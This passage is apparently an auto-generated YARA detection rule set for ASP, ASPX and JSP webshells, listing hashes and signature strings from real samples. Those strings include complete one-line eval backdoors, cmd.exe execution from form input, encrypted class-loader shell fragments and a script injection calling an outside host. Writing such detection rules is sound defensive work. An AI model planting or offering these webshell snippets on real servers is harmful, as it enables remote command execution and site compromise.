      $s15 = "Echo \".tab-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px; PADDING-LEFT: 5px; PADDING-B" ascii
      $s16 = " Echo \"<td height=32>PassWord" fullword ascii
      $s17 = "If Request(\"PassWord\")<>\"\" Then" fullword ascii
      $s18 = "Echo \"<title>ASPWebPack - " fullword ascii
      $s19 = "Echo \"<meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\">\"" fullword ascii
      $s20 = " Echo \"<div align=center><b>ASPWebPack - " fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 80KB and
      8 of them
}

rule webshell_asp_tool {
   meta:
      description = "webshell - file tool.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
   strings:
      $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
      $x2 = "cprthtml = \"<font face='arial' size='1'>.:: RHTOOLS 1.5 BETA(PVT)&copy; BY <a href='mailto:rhfactor@antisocial.com'>RHESUS FACT" ascii
      $s3 = "R</a> - <a href='HTTP://WWW.RHESUSFACTOR.CJB.NET' target='_blank'>HTTP://WWW.RHESUSFACTOR.CJB.NET</a> ::.</font>\"" fullword ascii
      $s4 = "Response.Write \"<FORM METHOD=\"\"POST\"\" ENCTYPE=\"\"multipart/form-data\"\" ACTION=\"\"\" & Request.ServerVariables(\"SCRIPT_" ascii
      $s5 = "Response.Write \"<tr><td\" & corfundotabela & \"><font face='arial' size='2'>:: \" & showobj(FilesItem0.path) & \"</td><td valig" ascii
      $s6 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javascript:document.open('\" & Request.ServerVariable" ascii
      $s7 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\" method=\"\"GET\"\"><input type=\"\"hidden\"\" n" ascii
      $s8 = "o do Command: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
      $s9 = "szTempFile = \"c:\\\" & oFileSys.GetTempName( ) " fullword ascii
      $s10 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
      $s11 = "onlinehelp = \"<font face=\"\"arial\"\" size=\"\"1\"\">.:: <a href=\"\"http://www.rhesusfactor.cjb.net\"\" target=\"\"_blank\"\"" ascii
      $s12 = "onlinehelp = \"<font face=\"\"arial\"\" size=\"\"1\"\">.:: <a href=\"\"http://www.rhesusfactor.cjb.net\"\" target=\"\"_blank\"\"" ascii
      $s13 = "Response.Write \"<b>Execut" fullword ascii
      $s14 = "Uploader.Upload()" fullword ascii
      $s15 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=mass&massact=dfc" ascii
      $s16 = "zable')\"\">SYS INFO</a> - <a href=\"\"#\"\" onclick=\"\"javascript:document.open('\" & Request.ServerVariables(\"SCRIPT_NAME\")" ascii
      $s17 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
      $s18 = "Response.Write \"<b>Arquitetura do Processador: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
      $s19 = "Response.Write \"<FORM METHOD=\"\"POST\"\" ENCTYPE=\"\"multipart/form-data\"\" ACTION=\"\"\" & Request.ServerVariables(\"SCRIPT_" ascii
      $s20 = "Response.Write \"<tr><td><font face=\"\"arial\"\" size=\"\"1\"\">HKEY_USERS </td><td><font face=\"\"arial\"\" size=\"\"1\"\"> HK" ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule asp {
   meta:
      description = "webshell - file asp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
   strings:
      $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
      $x2 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $x3 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
      $x4 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
      $x5 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
      $s6 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $s7 = "Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targetip & \"" ascii
      $s8 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
      $s9 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
      $s10 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
      $s11 = "xPost3.Send loginuser & loginpass & mt & deluser & quit " fullword ascii
      $s12 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
      $s13 = "1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err The" ascii
      $s14 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
      $s15 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
      $s16 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
      $s17 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Symantec\\\\pcAnywhere\\\\\"" ascii
      $s18 = "ws\\\\Temp\\\\\"\")'>Temp</a>m?<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>v,<a href='javascript:Sho" ascii
      $s19 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
      $s20 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Microsoft\\\\Media Index" ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule asp__1___2014_10_23_14_54_16 {
   meta:
      description = "webshell - file asp (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
   strings:
      $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
      $x2 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $x3 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
      $x4 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
      $x5 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
      $s6 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $s7 = "Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targetip & \"" ascii
      $s8 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
      $s9 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
      $s10 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
      $s11 = "xPost3.Send loginuser & loginpass & mt & deluser & quit " fullword ascii
      $s12 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
      $s13 = "1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err The" ascii
      $s14 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
      $s15 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
      $s16 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
      $s17 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Symantec\\\\pcAnywhere\\\\\"" ascii
      $s18 = "ws\\\\Temp\\\\\"\")'>Temp</a>m?<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>v,<a href='javascript:Sho" ascii
      $s19 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
      $s20 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Microsoft\\\\Media Index" ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule asp__1_ {
   meta:
      description = "webshell - file asp (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
   strings:
      $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
      $x2 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $x3 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
      $x4 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
      $x5 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
      $s6 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $s7 = "Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targetip & \"" ascii
      $s8 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
      $s9 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
      $s10 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
      $s11 = "xPost3.Send loginuser & loginpass & mt & deluser & quit " fullword ascii
      $s12 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
      $s13 = "1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err The" ascii
      $s14 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
      $s15 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
      $s16 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
      $s17 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Symantec\\\\pcAnywhere\\\\\"" ascii
      $s18 = "ws\\\\Temp\\\\\"\")'>Temp</a>m?<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>v,<a href='javascript:Sho" ascii
      $s19 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
      $s20 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Microsoft\\\\Media Index" ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_cmd {
   meta:
      description = "webshell - file cmd.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "30502171df45c790d04babd24440b79c702b27814ddfe6a9b2680e944379ebdd"
   strings:
      $x1 = "  Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
      $x2 = "cmd.asp = Command Execution" fullword ascii
      $s3 = "  szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
      $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
      $s5 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
      $s6 = "  Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)" fullword ascii
      $s7 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
      $s8 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s9 = "<FORM action=\"\" method=\"GET\">" fullword ascii
      $s10 = "szCMD = request(\"cmd\")" fullword ascii
      $s11 = "<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">" fullword ascii
      $s12 = "If (szCMD <> \"\") Then" fullword ascii
      $s13 = "<input type=\"submit\" value=\"Run\">" fullword ascii
      $s14 = "modified: 25/06/2003" fullword ascii
      $s15 = "  If (IsObject(oFile)) Then" fullword ascii
      $s16 = "    On Error Resume Next" fullword ascii
      $s17 = "    Call oFileSys.DeleteFile(szTempFile, True)" fullword ascii
      $s18 = "    Response.Write Server.HTMLEncode(oFile.ReadAll)" fullword ascii
      $s19 = "ASP_KIT" fullword ascii
      $s20 = "by: Maceo" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_vps {
   meta:
      description = "webshell - file vps.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
   strings:
      $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
      $x2 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
      $x3 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
      $x4 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
      $s5 = "Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targetip & \"" ascii
      $s6 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
      $s8 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
      $s9 = "xPost3.Send loginuser & loginpass & mt & deluser & quit " fullword ascii
      $s10 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
      $s11 = "1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err The" ascii
      $s12 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
      $s13 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
      $s14 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
      $s15 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Symantec\\\\pcAnywhere\\\\\"" ascii
      $s16 = "ws\\\\Temp\\\\\"\")'>Temp</a>m?<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>v,<a href='javascript:Sho" ascii
      $s17 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
      $s18 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Microsoft\\\\Media Index" ascii
      $s19 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
      $s20 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_shell {
   meta:
      description = "webshell - file shell.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6cd6746c91e7cbeed9a2abc1b32dc169c5cac487b896033e54f128dd0a960db5"
   strings:
      $x1 = "<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\"); Response.Write(" ascii
      $s2 = "0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load" ascii
      $s3 = "<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\"); Response.Write(" ascii
      $s4 = "ew System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U" ascii
      $s5 = ".Equals(this);%>" fullword ascii
      $s6 = "e45e329feb5d925b" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule webshell_jsp_shell {
   meta:
      description = "webshell - file shell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6b546e78cc7821b63192bb8e087c133e8702a377d17baaeb64b13f0dd61e2347"
   strings:
      $x1 = "AAAAA<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c)" ascii
      $s2 = "getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance" ascii
      $s3 = "eb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new " ascii
      $s4 = "AAAAA<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c)" ascii
      $s5 = "public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e3" ascii
      $s6 = "().equals(pageContext);}%>bbbb" fullword ascii
      $s7 = "e45e329feb5d925b" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule webshell_asp_good_1 {
   meta:
      description = "webshell - file good_1.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dc3ad511eae2564b5d3b94f93468b9fae1114f4b70d851177d6938ad99be21b6"
   strings:
      $s1 = "getFileExt = Mid(sFileName, InstrRev(sFileName, \".\") + 1) " fullword ascii
      $s2 = "dim file,content,path,task,paths,paths_str,nn,nnfilename,dpath,htmlpath,htmlpath_,htmlpath_str,addcontent,includefiles,noinclude" ascii
      $s3 = "files,filetype,hanfiles,recontent,site_root,defaulthtml,defaultreplace,read " fullword ascii
      $s4 = "  Set Fso = Server.CreateObject(\"Scripting.FileSystemObject\") " fullword ascii
      $s5 = "SET FSO=Server.CreateObject(\"Scripting.FileSystemObject\") " fullword ascii
      $s6 = "<%@LANGUAGE=\"VBSCRIPT\" CODEPAGE=\"65001\"%><% " fullword ascii
      $s7 = "  bintou=objstream.read(2) " fullword ascii
      $s8 = "                set f=fso.Getfile(server.mappath(Request.ServerVariables(\"SCRIPT_NAME\"))) " fullword ascii
      $s9 = "dim file,content,path,task,paths,paths_str,nn,nnfilename,dpath,htmlpath,htmlpath_,htmlpath_str,addcontent,includefiles,noinclude" ascii
      $s10 = "Function getCode(iCount) ''????????? " fullword ascii
      $s11 = "addcontent=request(\"addcontent\") " fullword ascii
      $s12 = "recontent=request(\"recontent\") " fullword ascii
      $s13 = "content=request(\"content\") " fullword ascii
      $s14 = "  Function getFileExt(sFileName) " fullword ascii
      $s15 = "objstream.Charset = Cset " fullword ascii
      $s16 = "                                Bianlireplate site_root_str(i),addcontent,recontent,includefiles,noincludefiles,filetype,hanfile" ascii
      $s17 = "function readfolder_(testfile) " fullword ascii
      $s18 = "Function ReadFromTextFile(file,CharSet) " fullword ascii
      $s19 = "function readfile5(testfile) " fullword ascii
      $s20 = "function readfile(testfile) " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 70KB and
      8 of them
}

rule webshell_aspx_ice {
   meta:
      description = "webshell - file ice.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0af43e6bd8e7d074ebd4e3f987b65072bfdd5bd439b8791ccf4ae7bc2360da57"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"ice\"],\"unsafe\");%>" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 1KB and
      all of them
}

rule webshell_asp_ice {
   meta:
      description = "webshell - file ice.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a2eed66ec0a2d97eb47bb75e4f31500f49d5f01be1b56bd90430c485252cf4d7"
   strings:
      $s1 = "<%eval request(\"ice\")%>" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 1KB and
      all of them
}

rule webshell_jsp_up {
   meta:
      description = "webshell - file up.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7439d1c0b9994b74db771d9568e3b845630e3497aab71f12cc3af954e7522e45"
   strings:
      $s1 = "long l = contentsize.longValue() - ROUGHSIZE; " fullword ascii
      $s2 = "out.println(\"FileName: \" + newfile.getName());" fullword ascii
      $s3 = "public String getBoundary(HttpServletRequest request,Properties prop) throws ServletException,IOException{" fullword ascii
      $s4 = "Long contentsize = new Long(prop.getProperty(\"content-length\",\"0\"));" fullword ascii
      $s5 = "// up.jsp = File Upload (unix)" fullword ascii
      $s6 = "public String getFileName(String secondline){" fullword ascii
      $s7 = "while((c = fin.read()) != -1){" fullword ascii
      $s8 = "while((c=fin.read()) != -1 ){" fullword ascii
      $s9 = "out.println(\"FileSize: \" + newfile.length());" fullword ascii
      $s10 = "fin.read(b,0,(int)l);" fullword ascii
      $s11 = "fin.read(b,0,1024);" fullword ascii
      $s12 = "fin.read(); " fullword ascii
      $s13 = "fin.read();  " fullword ascii
      $s14 = "if(\"content-type\".equalsIgnoreCase(header) ){" fullword ascii
      $s15 = "if(contentsize.longValue() < 1L ){" fullword ascii
      $s16 = "String secondline = st.getBuffer().toString();" fullword ascii
      $s17 = "<form name=\"test\" method=\"post\" action=\"\" enctype=\"multipart/form-data\">" fullword ascii
      $s18 = "String tboundary = st.getBuffer().toString();" fullword ascii
      $s19 = "String header = (String)enum.nextElement();" fullword ascii
      $s20 = "ServletInputStream fin =  request.getInputStream();" fullword ascii
   condition:
      uint16(0) == 0x6a3c and filesize < 10KB and
      8 of them
}

rule up_win32 {
   meta:
      description = "webshell - file up_win32.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dda9e7e898e8f973a0a16c576789337caf7da2f9303936de5b062e98966e50a0"
   strings:
      $s1 = "long l = contentsize.longValue() - ROUGHSIZE; " fullword ascii
      $s2 = "out.println(\"FileName: \" + newfile.getName());" fullword ascii
      $s3 = "public String getBoundary(HttpServletRequest request,Properties prop) throws ServletException,IOException{" fullword ascii
      $s4 = "Long contentsize = new Long(prop.getProperty(\"content-length\",\"0\"));" fullword ascii
      $s5 = "// up.jsp = File Upload (win32)" fullword ascii
      $s6 = "public String getFileName(String secondline){" fullword ascii
      $s7 = "while((c = fin.read()) != -1){" fullword ascii
      $s8 = "while((c=fin.read()) != -1 ){" fullword ascii
      $s9 = "out.println(\"FileSize: \" + newfile.length());" fullword ascii
      $s10 = "fin.read(b,0,(int)l);" fullword ascii
      $s11 = "fin.read(b,0,1024);" fullword ascii
      $s12 = "fin.read(); " fullword ascii
      $s13 = "fin.read();  " fullword ascii
      $s14 = "if(\"content-type\".equalsIgnoreCase(header) ){" fullword ascii
      $s15 = "String DPATH = \"c:\\\\\";" fullword ascii
      $s16 = "if(contentsize.longValue() < 1L ){" fullword ascii
      $s17 = "String secondline = st.getBuffer().toString();" fullword ascii
      $s18 = "<form name=\"test\" method=\"post\" action=\"\" enctype=\"multipart/form-data\">" fullword ascii
      $s19 = "String tboundary = st.getBuffer().toString();" fullword ascii
      $s20 = "String header = (String)enum.nextElement();" fullword ascii
   condition:
      uint16(0) == 0x6a3c and filesize < 10KB and
      8 of them
}

rule wooyun2015052301 {
   meta:
      description = "webshell - file wooyun2015052301.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f3d2eb157452e8cdbe6d9ca1f5ba41f022512a06f44789b3c3d263c860b6cd90"
   strings:
      $s1 = "<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/\"e\"+\"v\"+/*-/*-*/\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u" ascii
      $s2 = "<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/\"e\"+\"v\"+/*-/*-*/\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u" ascii
      $s3 = "egwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegakl" ascii
      $s4 = "ehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgre" ascii
      $s5 = "rghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre" ascii
      $s6 = "ewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewge" ascii
      $s7 = "wjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwe" ascii
      $s8 = "gaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrg" ascii
      $s9 = "mgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnew" ascii
